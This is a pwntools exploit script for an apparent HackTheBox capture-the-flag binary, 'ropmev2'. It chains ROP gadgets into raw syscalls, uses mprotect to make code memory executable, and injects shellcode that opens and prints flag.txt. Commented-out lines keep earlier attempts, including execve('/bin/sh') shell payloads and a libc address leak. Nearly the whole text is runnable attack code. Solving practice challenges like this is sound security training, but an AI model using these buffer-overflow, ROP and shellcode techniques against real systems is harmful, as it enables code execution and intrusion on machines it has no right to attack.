from pwn import *

#p = gdb.debug(["./ropmev2"])
p = remote("docker.hackthebox.eu", 32359)
#p = process("./ropmev2")
pop_rsi_rf = p64(0x0000000000401429)
pop_rax = p64(0x0000000000401162)
pop_rdi = p64(0x000000000040142b)
pop_rdx_rr = p64(0x0000000000401164)
syscall = p64(0x0000000000401168)
pad = p64(0xdeadbeefdeadbeef)


# helper function because i need to do lots of recon
def make_syscall(rax, rdi, rsi, rdx):
    return pop_rax + p64(rax) + pop_rdi + p64(rdi) + pop_rsi_rf + p64(rsi) + pad + pop_rdx_rr + p64(rdx) + pad + syscall

p.sendline("DEBUG\n\0")
p.readuntil("is 0x")
leak = int(p.readline(), 16)
log.info("leak: " + hex(leak))

# cheesed it and mprotected the code to be rwx, then read from stdin to the code segment
# nice
p.sendline("\0\0\0\0\0\0\0\0" * 27 + make_syscall(10, 0x400000, 0x3460, 7) + make_syscall(0, 0, 0x400000, 0xfff) + p64(0x400000))
p.readline()
p.send(asm(shellcraft.amd64.pushstr("flag.txt\0"), arch='amd64', os='linux'))
p.sendline(asm("""
mov rax, 2;
mov rdi, rsp;
mov rsi, 0;
mov rdx, 0;
syscall;

mov rdi, rax;
mov rax, 0;
mov rsi, rsp;
mov rdx, 30;
syscall;

mov rax, 1;
mov rdi, 1;
mov rsi, rsp;
mov rdx, 30;
syscall;
""", arch='amd64', os='linux'))
p.interactive()

# they seem to block execve so this attempt is useless
# p.sendline("\0\0\0\0\0\0\0\0" * 26 + "/bin/sh\0" + make_syscall(59, leak - 16, 0, 0))

# tried with argv as /bin/sh, no dice
# p.sendline("\0\0\0\0\0\0\0\0" + "/bin/sh\0" + p64(leak - 8 * 27) + "\0\0\0\0\0\0\0\0" * 24 + make_syscall(59, leak - 8 * 27, leak - 8 * 26, 0))

# add null byte so strlen fucks up
# used to leak libc_main addr so i can locate the libc they are using
# p.sendline("AAAAAAAA" * 26 + "\0AAAAAAA" + p64(0x0000000000401162) + p64(1) + pop_rdi + p64(1) + pop_rsi_rf + p64(leak + 0xd8) + pad + pop_rdx_rr + p64(8) + pad + syscall)
# unlucky, can't find a libc with that address

# tried to open flag.txt with syscalls and read it, didn't work since I had no way of writing
#p.sendline("\0\0\0\0\0\0\0\0" * 25 + "flag.txt" + "\0\0\0\0\0\0\0\0" + make_syscall(2, leak - 8 * 3, 0, 0) + make_syscall(0, 3, leak + 0xfff, 0xff) + make_syscall(1, 1, leak + 0xfff, 0xff))
